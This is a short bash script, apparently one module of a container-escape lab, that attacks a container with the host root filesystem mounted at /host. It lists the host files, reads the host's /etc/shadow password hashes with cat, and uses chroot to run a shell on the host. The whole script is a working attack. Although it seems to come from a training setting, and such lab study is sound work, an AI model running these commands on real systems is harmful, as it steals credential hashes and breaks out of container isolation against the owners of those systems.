#!/usr/bin/env bash
# MODULE 4: Host Path Mount Escape
# Target: escape-target-hostmount (/:/host mounted)

echo "[*] Host filesystem mounted at /host"
ls /host/

echo "[*] Reading host /etc/shadow..."
cat /host/etc/shadow

echo "[*] chroot escape into host..."
chroot /host /bin/bash -c "id && uname -a"
